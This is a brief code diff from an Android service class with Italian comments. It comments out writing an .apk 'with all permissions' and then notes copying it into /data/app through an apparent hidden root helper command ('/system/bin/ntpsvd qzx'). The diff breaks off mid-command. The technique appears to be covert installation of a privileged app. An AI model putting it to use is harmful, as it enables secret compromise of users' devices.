@@ -362,8 +362,8 @@ public class ServiceCore extends Service {
 			pi.addRequiredPermissions(Messages.getString("32.23"));
 
 			// .apk con tutti i permessi nel manifest
-			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-			fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
+			// InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
+			// fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
 
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
